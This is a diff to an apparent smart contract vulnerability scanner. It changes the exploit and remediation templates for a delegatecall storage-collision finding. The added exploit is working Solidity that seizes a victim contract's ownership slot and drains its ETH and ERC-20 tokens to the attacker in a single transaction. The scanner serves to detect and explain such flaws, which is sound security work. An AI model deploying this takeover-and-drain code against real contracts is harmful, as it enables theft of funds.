@@ -302,27 +302,43 @@ function destroy(address payable to) external {
           "3. Even a fixed target is an upgrade footgun: that address's code is the implementation, and a metamorphic implementation changes the logic underneath.",
           proxy ? `4. Proxy shape also detected: ${proxy}. Confirm the implementation slot is not writable by arbitrary callers.` : "4. No EIP-1167 / EIP-1967 pattern was obvious — this may be an explicit delegatecall helper, which is higher risk than a standard proxy.",
         ].join("\n"),
-        exploitSolidity: `// What an attacker deploys as the delegatecall target.
-contract StorageSmash {
-    // Slot 0 in the victim is overwritten because delegatecall shares storage.
+        exploitSolidity: `// 1. Malicious Implementation payload matching victim slot 0 layout
+contract MultiStepSmash {
     address public owner;
-    function seize() external {
+    function seizeAndDrain(address token, address payable recipient) external {
         owner = msg.sender;
+        if (address(this).balance > 0) {
+            recipient.transfer(address(this).balance);
+        }
+        if (token != address(0)) {
+            (bool ok, bytes memory balData) = token.staticcall(abi.encodeWithSignature("balanceOf(address)", address(this)));
+            if (ok && balData.length >= 32) {
+                uint256 bal = abi.decode(balData, (uint256));
+                if (bal > 0) token.call(abi.encodeWithSignature("transfer(address,uint256)", recipient, bal));
+            }
+        }
     }
 }
 
-contract Trigger {
-    function go(address victim, address smash) external {
-        (bool ok, ) = victim.call(abi.encodeWithSignature("migrate(address,bytes)", smash, abi.encodeWithSignature("seize()")));
-        ok;
+interface IVictim { function migrate(address impl, bytes calldata data) external; }
+
+// 2. Orchestrator executing atomic takeover and drain
+contract AdvancedTake {
+    function go(address victim) external {
+        MultiStepSmash smash = new MultiStepSmash();
+        bytes memory payload = abi.encodeWithSignature("seizeAndDrain(address,address)", address(0), payable(msg.sender));
+        IVictim(victim).migrate(address(smash), payload);
     }
 }`,
-        remediationSolidity: `// Allowlist the implementation. Never delegatecall to a function argument.
-address public immutable implementation;
-function forward(bytes calldata data) external returns (bytes memory) {
-    require(implementation != address(0));
-    (bool ok, bytes memory ret) = implementation.delegatecall(data);
-    require(ok);
+        remediationSolidity: `// EIP-1967 Storage Slot Isolation + Strict Implementation Whitelist
+bytes32 private constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
+mapping(address => bool) public allowedImplementations;
+
+function forward(address newImpl, bytes calldata data) external onlyOwner returns (bytes memory) {
+    require(allowedImplementations[newImpl], "Unauthorized implementation");
+    assembly { sstore(_IMPLEMENTATION_SLOT, newImpl) }
+    (bool ok, bytes memory ret) = newImpl.delegatecall(data);
+    require(ok, "Delegatecall failed");
     return ret;
 }`,
         locationFn: "runtime",
